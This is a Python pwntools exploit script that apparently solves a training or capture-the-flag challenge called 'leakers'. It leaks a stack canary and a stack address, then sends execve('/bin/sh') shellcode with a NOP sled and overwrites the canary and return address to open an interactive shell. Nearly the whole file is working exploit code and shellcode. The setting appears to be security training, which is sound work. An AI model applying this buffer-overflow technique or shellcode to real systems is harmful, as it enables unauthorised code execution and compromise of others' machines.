from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
#r = remote("training.jinblack.it", 2011)

r = process("./leakers") 

''' not attaching to remote
b * 0x4011d4
b * 0x401206

gdb.attach(r, """
	c
        """)
 ''' 


input("wait")

# receive until name?\n
print(r.recvuntil("leak!\n"))

'''
jmp endshellcode
shellcode:
pop rdi
mov rsi, rdi
add rsi, 8
mov rdx, rsi
mov rax, 0x3b
syscall

endshellcode:
call shellcode
nop #replace with "/bin/sh"
'''
shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00"

shellcode = b"\x90" * (104 - len(shellcode)) + shellcode

input("wait")

''' By doing this, we can find that there is a leak and the address has an offset of 22 relative to the end of the buffer

text_for_gdb_leakfind = b"T" * 136
r.send(text_for_gdb_leakfind)
print(r.recvuntil('\n'))

input("wait")
print(r.recv(numb = len(text_for_gdb_leakfind) + 1, timeout = 1))

'''

# --------------- LEAK CANARY -----------------
leak_canary = "A" * 104 + 'B'

r.send(leak_canary)

print(r.recvuntil('\n'))
#Receive "> [text sent]"
print(r.recv(numb = len(leak_canary) + 2, timeout = 1))

#Receive the canary
canary = b'\0' + r.recv(numb=7)
print("Canary: ")
print(binascii.hexlify(canary))

r.clean()

r.recvline(timeout = 1)

input("Canary leak done, proceed to buffer leak\n")

# --------------- LEAK BUFFER ADDRESS -----------------
# Fill the 104 byte buffer plus 22 bytes of offset
leak_buffer = "A" * 136

r.send(leak_buffer)

#Receive "> [text sent]"
print(r.recv(numb = len(leak_buffer) + 2, timeout = 1))
#Receive leaked address
leaked_address_string = r.recv(numb=14)
r.clean()

#Pack as hex
leaked_address = hex(unpack(leaked_address_string, 'all', endian='little', sign=False))
#Through berry careful analysis, we figured that addr - 300 lands on the buffer
buffer_approx_address = hex(int(leaked_address, 16) - 300)
buffer_address_string = str(buffer_approx_address)
print("Buffer approx address: ")
print(buffer_address_string)
# Split the hex without the 0x at the beginning and join it into a string
splitted = [buffer_address_string[i-2:i] for i in range(len(buffer_address_string), 2, -2)]
final_buffer_address = binascii.unhexlify(''.join(splitted)) + b"\x00\x00"
print(final_buffer_address)
#print(binascii.a2b_hex(final_buffer_address.encode('utf8')).decode('utf8'))

input("Buffer leak done, proceed to complete exploit\n")

#Overwrite canary and eip
overwrite_canary = shellcode + canary + b"B" * 8 + final_buffer_address
r.send(overwrite_canary)
print("Canary overwritten\n")

# Spawn a shell that allows us to interact witht the remote program
r.interactive()

